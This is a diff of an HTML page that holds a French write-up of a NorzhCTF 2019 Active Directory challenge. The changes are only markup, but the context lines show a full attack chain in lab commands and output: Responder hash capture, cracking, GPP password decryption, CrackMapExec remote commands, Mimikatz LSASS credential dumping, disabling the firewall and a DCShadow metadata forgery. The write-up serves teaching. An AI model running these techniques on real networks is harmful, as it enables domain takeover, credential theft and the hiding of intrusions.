@@ -203,7 +203,7 @@
 
   </header>
   <div class="post">
-    <p>Le NorzhCTF, organisé en marge du FIC 2019, m&rsquo;a donné l&rsquo;occasion de concevoir, en collaboration avec <!-- raw HTML omitted -->@AzrakelK (L0n3w0lf)<!-- raw HTML omitted -->, le scénario d&rsquo;attaque en relation avec un domaine Active Directory. Cet article traite de ce challenge et présente notre solution. Le challenge a également été rejoué dans le cadre du RedHackCTF 2019, sous le même nom.</p>
+    <p>Le NorzhCTF, organisé en marge du FIC 2019, m&rsquo;a donné l&rsquo;occasion de concevoir, en collaboration avec <a href="https://twitter.com/AzrakelK" target="blank">@AzrakelK (L0n3w0lf)</a>, le scénario d&rsquo;attaque en relation avec un domaine Active Directory. Cet article traite de ce challenge et présente notre solution. Le challenge a également été rejoué dans le cadre du RedHackCTF 2019, sous le même nom.</p>
 <p>Le challenge &ldquo;Game of Pwn - A song of users and domain&rdquo; est un scénario composé de 4 challenges (4 flags) permettant aux participants de découvrir et exploiter certaines vulnérabilités ou faiblesses de configuration connues dans un domaine Active Directory.</p>
 <h3 id="sommaire">Sommaire</h3>
 <ul>
@@ -320,14 +320,14 @@ mimikatz # lsadump::dcshadow /push
 $ sudo ./cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'repadmin /showobjmeta DC01.NORZH.LAN &quot;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&quot;'
 
 rpcclient $&gt; queryuser 0x451
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h2 id="prérequis">Prérequis</h2>
 <p>Cette partie détaille les différents prérequis à la réalisation du challenge, notamment en ce qui concerne l&rsquo;accès aux différents challenges qui n&rsquo;étaient pas directement joignables.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="connexion-au-réseau-interne">Connexion au réseau interne</h3>
 <p>Une fois branché au réseau interne de l&rsquo;entreprise, par l&rsquo;intermédiaire des switchs fournis aux joueurs, on se rend rapidement compte qu&rsquo;il n&rsquo;y a pas de serveur DHCP. Par conséquent, il faut trouver un moyen d&rsquo;identifier le LAN sur lequel nous sommes afin de configurer manuellement le réseau.</p>
 <p>Pour cela, on sort Wireshark afin d&rsquo;observer ce qui se passe sur le réseau.</p>
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/norzhctf-2019/GoP_1_Wireshark.png" alt="Wireshark GoP" class="imgSize"/></center>
 <p>Rapidement, on observe des interactions effectuées autour de 2 adresses IP :</p>
 <ul>
 <li><strong>10.69.88.23</strong> - Il semble d&rsquo;agir d&rsquo;une machine nommée &ldquo;CLIENT01&rdquo;. Hypothèse, un client Windows ?</li>
@@ -341,7 +341,7 @@ iface eth0 inet static
 	gateway 10.69.88.254 
 </code></pre></div><p>Dernier point, on redémarre le service réseau, et on est bon !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo service networking restart
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h3 id="découverte-des-machines">Découverte des machines</h3>
 <p>Second prérequis au challenge, savoir quoi sur quoi taper&hellip; Pour cela, il va être nécessaire de faire de la reconnaissance afin de découvrir les différentes machines.</p>
 <p>On commence par un scan simple sur la plage réseau afin d&rsquo;identifier les machines sur ce LAN. Deux machines sont identifiées mais seulement une nous intéresse. Il s&rsquo;agit de la machine identifiée avec Wireshark. 3 ports sont ouverts (135, 139, 445). Il s&rsquo;agit de ports classiques sur des machines Windows à l&rsquo;intérieur d&rsquo;un domaine.</p>
@@ -405,10 +405,10 @@ Uptime guess: 0.020 days (since Sat Jan 26 17:22:17 2019)
 TCP Sequence Prediction: Difficulty=252 (Good luck!)
 IP ID Sequence Generation: Incremental
 </code></pre><p>Tout est fin prêt pour passer au challenge.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h2 id="challenge-1---entrée-sur-le-domaine">Challenge 1 - Entrée sur le domaine</h2>
 <p>La première partie du challenge consiste à trouver un point d&rsquo;entrée sur le domaine Active Directory ou sur les machines Windows. Aucun identifiant n&rsquo;est connu à ce moment du challenge.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="récupération-du-hash-netntlmv2-utilisateur">Récupération du hash NetNTLMv2 utilisateur</h3>
 <p>Dans le cadre d&rsquo;un SI d&rsquo;entreprise, il n&rsquo;est pas rare que les ordinateurs du domaine recherchent des ressources diverses et variées sur le réseau. Cependant, si un client ne parvient pas à trouver une ressource en particulier, si cela n&rsquo;a pas été désactivé, il a envoyer successivement des requêtes LLMNR puis NBT-NS afin de demander aux machines voisines si elles ne connaissent pas la ressource.</p>
 <p>Il est possible d&rsquo;exploiter ce comportement en réalisant une attaque Man In The Middle, à l&rsquo;aide de l&rsquo;outil <strong>responder</strong> par exemple. En pratique, si ce genre de requête circule sur le réseau, notre machine (attaquant) va alors se faire passer pour cette ressource. Ainsi, une réponse est envoyée au client, lui disant que la ressource a été trouvée et ce dernier envoie ses identifiants sur le réseau afin de s&rsquo;y connecter.</p>
@@ -419,9 +419,9 @@ IP ID Sequence Generation: Incremental
 [SMBv2] NTLMv2-SSP Client   : 10.69.88.23
 [SMBv2] NTLMv2-SSP Username : NORZH\dmervault
 [SMBv2] NTLMv2-SSP Hash     : dmervault::NORZH:b36fe00d35fbe870:CD538CF0935600E8C065F9CA4830B677:0101000000000000C0653150DE09D201D3C9ADFEC5AEFA66000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000000000000002000009811A9EAB1FE9DADCBB5D03032B97801110DF0BCCD0C7A06D494CFEBD85161180A001000000000000000000000000000000000000900180063006900660073002F00540048003300470034004D004500000000000000000000000000
-</code></pre><p>Un compte utilisateur du domaine est donc trouvé avec cette technique ! L&rsquo;utilisateur <strong>dmervault</strong>.<!-- raw HTML omitted -->
+</code></pre><p>Un compte utilisateur du domaine est donc trouvé avec cette technique ! L&rsquo;utilisateur <strong>dmervault</strong>.<br/>
 Cependant, même s&rsquo;il existe des attaques de type &ldquo;Pass the Hash&rdquo; pour certains hash (typiquement, NTLM), ce n&rsquo;est pas le cas des hashs NTLMv2, ainsi le mot de passe en clair est nécessaire.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="cassage-du-hash-et-premier-flag">Cassage du hash et premier flag</h3>
 <p>Le hash récupéré sur le réseau est du type Net-NTLMv2 (NTLMv2). Il s&rsquo;agit du type de hash par défaut utilisé depuis Windows 2000. Il est très largement possible de cracker ce type de hash, même si cela peut s&rsquo;avérer long.</p>
 <p>Dans la vraie vie, les entreprises sont souvent équipées de politiques de mots de passe, impliquant des mots de passe utilisateur ayant une certaine complexité (et encore&hellip;) mais dans le cadre d&rsquo;un CTF, il n&rsquo;est pas rare que les mots de passe à trouver soient tirés de certaines wordlists connues.</p>
@@ -435,10 +435,10 @@ littledog        (dmervault)
 Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
 Session completed
 </code></pre><p>Assez rapidement, le mot de passe de l&rsquo;utilisateur tombe ! On dispose donc d&rsquo;un compte utilisateur, pouvant potentiellement se connecter au domaine et accessoirement, du premier flag du challenge ENSIBS{littledog}.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h2 id="challenge-2---compromission-de-la-machine-cliente">Challenge 2 - Compromission de la machine cliente</h2>
 <p>A ce stade, on dispose d&rsquo;un compte utilisateur du domaine, et de quelques informations sur la suite du challenge. En effet, il est indiqué que nous devons chercher du côté des fichiers privés et locaux, donc probablement sur la machine cliente.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="reconnaissance">Reconnaissance</h3>
 <p>Ayant de nouveaux accès, il peut être intéressant d&rsquo;effectuer une phase de reconnaissance. On peut par exemple se connecter en RPC au contrôleur de domaine afin de récolter des informations.</p>
 <pre><code>$ rpcclient -U dmervault 10.34.67.4
@@ -497,7 +497,7 @@ SMB         10.34.67.4      445    DC01             C$                          
 SMB         10.34.67.4      445    DC01             IPC$                            Remote IPC
 SMB         10.34.67.4      445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.34.67.4      445    DC01             SYSVOL          READ            Logon server share 
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="utilisation-du-partage-sysvol">Utilisation du partage SYSVOL</h3>
 <p><strong>SYSVOL</strong> est un partage réseau regroupant l&rsquo;ensemble des éléments utiles dans le processus de réplication des DC, mais également les éléments qui doivent être accessibles pour l&rsquo;ensemble des ordinateurs du domaine (par exemple, scripts de connexion, GPO, &hellip;). Par conséquent, il doit être accessible en lecture à distance. On peut ainsi s&rsquo;y connecter de la façon suivante.</p>
 <pre><code>$ smbclient -U dmervault //10.34.67.4/SYSVOL
@@ -506,7 +506,7 @@ Unable to initialize messaging context
 Enter WORKGROUP\dmervault's password: 
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt;
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="exploitation-de-la-vulnérabilité-ms14-025">Exploitation de la vulnérabilité MS14-025</h3>
 <p>L&rsquo;intérêt ici se situe dans les <strong>Stratégies de Groupe (GPO)</strong> appliquées au domaine. Certains systèmes n&rsquo;étant pas à jour (ce qui peut arriver souvent dans un cadre réel) souffrent d&rsquo;une vulnérabilité Microsoft, la <strong>MS14-025</strong> permettant ainsi d&rsquo;exploiter l&rsquo;application des GPO afin d&rsquo;y retrouver le mot de passe du compte utilisé pour appliquer la GPO. Dans la plupart des cas, il s&rsquo;agit de l&rsquo;administrateur local de la machine.</p>
 <p>On file donc au coeur de la GPO trouver le fichier <code>Groups.xml</code>, utilisé pour stocker les informations de l&rsquo;utilisateur impliqué dans la stratégie.</p>
@@ -527,7 +527,7 @@ getting file \NORZH.LAN\Policies\{195471B6-B0C6-4AD2-9853-28E2B4E9CEF6}\Machine\
 <pre><code>$ gpp-decrypt hT4tFpr32vG4LZHmnqXM4d8fJ0MfZZdLg0QK40Oq6UC4atw0nUeUCkJDLb1FzouL
 /usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
 0h_y3@_Y0u_GoAt_Me#
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="fouille-et-récupération-du-second-flag">Fouille et récupération du second flag</h3>
 <p>Maintenant que nous disposons du mot de passe de l&rsquo;administrateur du client, il est possible de s&rsquo;y connecter en ayant des privilèges élevés !</p>
 <pre><code>$ cme smb 10.69.88.23 -u Administrator -p &quot;0h_y3@_Y0u_GoAt_Me#&quot; --local-auth
@@ -565,22 +565,22 @@ smb: \&gt;
 Well done ! Looks like you owned this first machine ! Here is the flag : ENSIBS{0x2adb3e_w1nt3r_1s_c0minG#}
 
 Road to domain p0wnage ! Your next flag should be hidden in domain admins private files, g00d luck !
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h2 id="challenge-3---contrôle-du-domaine">Challenge 3 - Contrôle du domaine</h2>
 <p>Comme l&rsquo;indique le fichier texte récupéré, la prochaine étape consiste à compromettre le domaine complet.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="récupération-du-dump-lsass">Récupération du dump LSASS</h3>
 <p>Premier élément à notre portée, deux fichiers laissés dans le répertoire d&rsquo;audit. Un scan de ports, pas vraiment utile dans notre cas, mais surtout, un fichier <code>lsass.dmp</code> qui semble bien plus important&hellip; Sous Windows, le processus <code>lsass.exe</code> est l&rsquo;élément qui gère l&rsquo;authentification des utilisateurs (locaux ou domaine) sur le système. Le service LSASS (Local Security Authority Subsystem Service) stocke également les informations de connexion des sessions utilisateurs actives.</p>
 <pre><code>smb: \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\&gt; get lsass.DMP 
 getting file \Users\Administrator\Documents\Audit_20_12_2018_Confidentiel\lsass.DMP of size 31456493 as lsass.DMP (14149.8 KiloBytes/sec) (average 13647.0 KiloBytes/sec)
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="analyse-de-la-mémoire-lsass">Analyse de la mémoire LSASS</h3>
 <p>Plusieurs méthodes existent afin d&rsquo;exploiter le processus <code>lsass.exe</code> afin de récupérer des informations. D&rsquo;une manière générale, si le dump du processus a été réalisé alors que des utilisateurs étaient connectés à la machine, alors les informations de connexion de ces derniers se retrouveront dans le dump.</p>
 <p>L&rsquo;exploitation du dump peut se faire à l&rsquo;aide de l&rsquo;utilitaire <strong>Mimikatz</strong>.</p>
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/norzhctf-2019/GoP_2_Mimikatz.gif" alt="Mimikatz GoP" class="imgSize"/></center>
 <p>La première commande <code>sekurlsa::minidump lsass.DMP</code> sert à spécifier qu&rsquo;on n&rsquo;utilise pas le processus <code>lsass.exe</code> courant de la machine mais un fichier contenant un dump de la mémoire du processus. Ainsi, on lui fournit le chemin du fichier à analyser.</p>
 <p>La seconde commande <code>sekurlsa::logonPasswords /full</code> sert à récupérer l&rsquo;ensemble des informations utilisateurs stockées en mémoire. Ainsi, on récupère le compte de l&rsquo;utilisateur <strong>Jon Snow (jsnow)</strong> ! On dispose donc maintenant d&rsquo;un compte privilégié.. Let&rsquo;s pwn !</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="connexion-au-dc-et-récupération-du-troisième-flag">Connexion au DC et récupération du troisième flag</h3>
 <p>De la même façon que pour l&rsquo;administrateur local, il est possible de se connecter au domaine avec notre nouvel utilisateur et ainsi de voir qu&rsquo;on dispose de privilèges élevés ! Cela est visible entre autres avec <strong>CrackMapExec</strong> qui nous indique que nous sommes administrateur de la machine (Pwn3d!).</p>
 <pre><code>$ cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot;
@@ -624,11 +624,11 @@ If you success into attacking this, the description of Jon Snow will be auto-upd
 Good luck !
 </code></pre><p>En effet, il est ici demandé de modifier la description de l&rsquo;utilisateur <strong>Daenerys Targaryen</strong> de façon à ce que cette modification apparaisse dans l&rsquo;Active Directory comme ayant été faite le <code>01/01/2017</code> par l&rsquo;utilisateur ayant l&rsquo;UID <code>00000000-0000-0000-0000-000000000000</code> et l&rsquo;USN <code>42</code>. Il n&rsquo;est pas précisé de description particulière.. Ainsi, on peut y mettre ce qu&rsquo;on veut. Étrange vous dîtes ?</p>
 <p>Il est temps de RTFM puis exploiter !</p>
-<!-- raw HTML omitted -->
+<br/>
 <h2 id="challenge-4---métadonnées-de-réplication">Challenge 4 - Métadonnées de réplication</h2>
 <p>Après quelques recherches sur les différents paramètres et éléments liés aux utilisateurs dans un domaine AD, on apprend que la description est en fait un des différents attributs. La modification de n&rsquo;importe quel attribut de n&rsquo;importe quel objet dans un domaine Active Directory produit ce qu&rsquo;on appelle une metadonnée de réplication. Il s&rsquo;agit d&rsquo;informations permettant d&rsquo;identifier la modification apportée. Cela est généralement utilisé dans le cadre de la réplication entre différents contrôleur de domaine. Le but ici recherché est donc de contrôler ces metadonnées de réplication lors de la modification de la description&hellip;</p>
 <p>Quelques recherches sur le sujet nous amènent facilement à une attaque relativement récente de post-compromission (une fois la cible compromise) permettant d&rsquo;effectuer ce genre d&rsquo;action afin de cacher ses traces, il s&rsquo;agit du <strong>DCShadow</strong> !</p>
-<!-- raw HTML omitted -->
+<br/>
 <h3 id="activation-de-rdp">Activation de RDP</h3>
 <p>Plusieurs façon pour arriver à nos fins.. Pour des soucis de simplicité et de clarté et étant donné que nous avons besoin d&rsquo;accéder à la machine cliente, RDP semble être un bon compromis.</p>
 <p>Seulement.. RDP est désactivé sur le client. Pas de problème ! On est admin, on fait ce qu&rsquo;on veut ! Ainsi, on peut l&rsquo;activer, de différentes façons. L&rsquo;outil <strong>CrackMapExec</strong> dispose par exemple d&rsquo;un module permettant d&rsquo;activer ou désactiver le RDP sur une cible.</p>
@@ -637,7 +637,7 @@ SMB         10.69.88.23     445    CLIENT01         [*] Windows 7 Professional 7
 SMB         10.69.88.23     445    CLIENT01         [+] NORZH\jsnow::8n2K@j4hfUK#5Jek# (Pwn3d!)
 RDP         10.69.88.23     445    CLIENT01         [+] RDP enabled successfully
 
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="neutralisation-du-pare-feu-windows">Neutralisation du pare-feu Windows</h3>
 <p>Deuxième point important, le pare-feu. En effet, la recherche d&rsquo;informations et ressources sur <strong>DCShadow</strong> nous apprend que le pare-feu Windows doit être désactivé si on veut réussir à exploiter.</p>
 <p>Une fois encore, tout un tas de façons de le faire.. Afin d&rsquo;éviter l&rsquo;utilisation d&rsquo;un shell meterpreter, j&rsquo;ai choisi de le faire en exécutant une commande à distance avec <strong>CrackMapExec</strong>. L&rsquo;option <code>-x</code> permet d&rsquo;exécuter une commande avec <code>cmd.exe</code> tandis que l&rsquo;option <code>-X</code> permet d&rsquo;exécuter du Powershell.</p>
@@ -761,11 +761,11 @@ SMB         10.69.88.23     445    CLIENT01         MaxFileSize                 
 SMB         10.69.88.23     445    CLIENT01         
 SMB         10.69.88.23     445    CLIENT01         Ok.
 
-</code></pre><!-- raw HTML omitted -->
+</code></pre><br/>
 <h3 id="connexion-rdp">Connexion RDP</h3>
 <p>Tout semble prêt pour l&rsquo;exploitation ! On peut donc commencer par se connecter en RDP à la machine cliente. J&rsquo;utilise l&rsquo;outil <strong>remmina</strong> car il permet de mettre en place un dossier partagé entre la machine attaquante et la cible de la connexion RDP. On va voir que cela s&rsquo;avère particulièrement utile dans notre cas.</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/norzhctf-2019/GoP_3_remmina.png" alt="Connexion RDP" class="imgSize"/></center>
+<br/>
 <h3 id="exploitation-dc-shadow">Exploitation DC Shadow</h3>
 <p>L&rsquo;exploitation de l&rsquo;attaque <strong>DCShadow</strong> peut se faire avec <strong>Mimikatz</strong>. Pour cela, on va apporter une version de l&rsquo;outil sur la machine cible au travers du dossier partagé créé auparavant. Ainsi, on pourra l&rsquo;exécuter directement depuis ici.</p>
 <p>L&rsquo;attaque se réalise en plusieurs étapes :</p>
@@ -788,8 +788,8 @@ mimikatz # lsadump::dcshadow /object:dtargaryen /attribute:description /value:&q
 <pre><code># Utilisation du module lsadump afin de pousser les modifications sur le domaine
 mimikatz # lsadump::dcshadow /push
 </code></pre><p>La capture suivante illustre l&rsquo;attaque sur la machine cliente ainsi que le résultat obtenu. Un message &ldquo;Sync Done&rdquo; suivi du dés-enregistrement du faux contrôleur semble indique la réussite de l&rsquo;attaque.</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<center><img src="/img/writeups/norzhctf-2019/GoP_4_DCShadow.png" alt="DCShadow GoP" class="imgSize"/></center>
+<br/>
 <h3 id="vérification-et-récupération-du-quatrième-flag">Vérification et récupération du quatrième flag</h3>
 <p>Afin de vérifier si la nouvelle description ainsi que les métadonnées ont été poussées, on peut utiliser l&rsquo;utilitaire <strong>repadmin</strong> sur le contrôleur de domaine. Ainsi, on va demander à afficher métadonnées de réplication pour les différents attributs de l&rsquo;utilisateur <strong>Daenerys Targaryen</strong>. Cela peut se faire par l&rsquo;exécution de repadmin via crackmapexec.</p>
 <pre><code>sudo ./cme smb 10.34.67.4 -u jsnow -p &quot;:8n2K@j4hfUK#5Jek#&quot; -x 'repadmin /showobjmeta DC01.NORZH.LAN &quot;CN=Daenerys Targaryen,CN=Users,DC=NORZH,DC=LAN&quot;'
@@ -861,7 +861,7 @@ SMB         10.34.67.4      445    DC01             ============================
 	padding1[0..7]...
 	logon_hrs[0..21]...
 </code></pre><p>B00m ! Dernier flag attrapé ! Contrôle total du domaine et traces pouvant être effacées, mais également fin de cette épopée.</p>
-<!-- raw HTML omitted -->
+<br/>
 <h2 id="retex-et-mot-de-la-fin">RETEX et mot de la fin</h2>
 <p>Ce paragraphe est plus un retour personnel sur le challenge, dans la mesure où nous l&rsquo;avons conçu pour le Norzh CTF avec l&rsquo;idée en tête de réaliser un scénario de challenge basé sur des infrastructures Windows. Avec quelques jours de recul et quelques retours, plusieurs éléments et erreurs peuvent être remontés :</p>
 <ul>
@@ -870,7 +870,7 @@ SMB         10.34.67.4      445    DC01             ============================
 <li>Certains énoncés, tels que celui du DC Shadow, pouvaient ne pas être clairs.</li>
 </ul>
 <p>Nous sommes néanmoins heureux d&rsquo;avoir réalisé ce challenge et espérons que l&rsquo;ensemble des participants l&rsquo;ont apprécié !</p>
-<p>N&rsquo;hésitez pas nous faire part de vos retours ou vos questions, si besoin, via Twitter (<!-- raw HTML omitted -->@Haax9_<!-- raw HTML omitted --> et  <!-- raw HTML omitted -->@AzrakelK<!-- raw HTML omitted -->). Pour les personnes souhaitant refaire le challenge, il devrait être également possible de vous donner les machines virtuelles, au cas par cas.</p>
+<p>N&rsquo;hésitez pas nous faire part de vos retours ou vos questions, si besoin, via Twitter (<a href="https://twitter.com/Haax9_" target="blank">@Haax9_</a> et  <a href="https://twitter.com/AzrakelK" target="blank">@AzrakelK</a>). Pour les personnes souhaitant refaire le challenge, il devrait être également possible de vous donner les machines virtuelles, au cas par cas.</p>
   </div>
   
 
